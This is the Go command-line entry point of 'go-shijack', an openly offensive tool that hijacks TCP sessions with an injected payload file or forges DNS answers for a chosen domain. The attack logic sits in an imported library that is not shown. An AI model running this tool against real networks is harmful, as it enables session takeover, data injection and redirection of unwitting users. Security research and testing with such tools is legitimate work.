package main

import (
	"github.com/ssst0n3/go-shijack"
	"github.com/urfave/cli/v2"
	"log"
	"net"
	"os"
)

const (
	name  = "go-shijack"
	usage = `tcp/udp connection hijacker, go rewrite of shijack`
)

func main() {
	app := &cli.App{
		Name:  name,
		Usage: usage,
		Action: func(context *cli.Context) (err error) {
			interfaceName := context.String("interface")
			srcIp := context.String("src-ip")
			srcPort := context.Uint("src-port")
			dstIp := context.String("dst-ip")
			dstPort := context.Uint("dst-port")
			payloadFile := context.String("payload-file")
			keep := context.Bool("keep")
			protocol := context.String("protocol")
			switch protocol {
			case "tcp", "":
				gohijack.Hijack(interfaceName, srcIp, uint32(srcPort), dstIp, dstPort, payloadFile, !keep)
			case "dns":
				var answerIp net.IP
				dnsDomain := context.String("dns-domain")
				dnsIp := context.String("dns-ip")
				if dnsIp != "" {
					answerIp = net.ParseIP(dnsIp)
				}
				gohijack.HijackDNS(interfaceName, srcIp, uint32(srcPort), dnsDomain, answerIp, payloadFile, !keep)
			default:
				log.Fatalf("unknown protocol: %s (want tcp or dns)", protocol)
			}
			return
		},
		Flags: []cli.Flag{
			&cli.StringFlag{
				Name:     "interface",
				Aliases:  []string{"t"},
				Required: true,
			},
			&cli.StringFlag{
				Name:     "src-ip",
				Aliases:  []string{"i", "si"},
				Required: true,
			},
			&cli.UintFlag{
				Name:     "src-port",
				Aliases:  []string{"p", "sp"},
				Required: true,
			},
			&cli.StringFlag{
				Name:     "dst-ip",
				Aliases:  []string{"di"},
				Required: false,
			},
			&cli.UintFlag{
				Name:     "dst-port",
				Aliases:  []string{"dp"},
				Required: false,
			},
			&cli.StringFlag{
				Name:     "payload-file",
				Aliases:  []string{"f"},
				Required: false,
			},
			&cli.BoolFlag{
				Name:    "keep",
				Aliases: []string{"k"},
			},
			&cli.StringFlag{
				Name:    "protocol",
				Aliases: []string{"proto"},
				Value:   "tcp",
				Usage:   "tcp or dns",
			},
			&cli.StringFlag{
				Name:    "dns-domain",
				Aliases: []string{"dd"},
				Usage:   "dns hijack: domain to answer (auto-construct mode)",
			},
			&cli.StringFlag{
				Name:    "dns-ip",
				Aliases: []string{"dip"},
				Usage:   "dns hijack: A record IP to return (auto-construct mode)",
			},
		},
	}
	if err := app.Run(os.Args); err != nil {
		log.Fatal(err)
	}
}
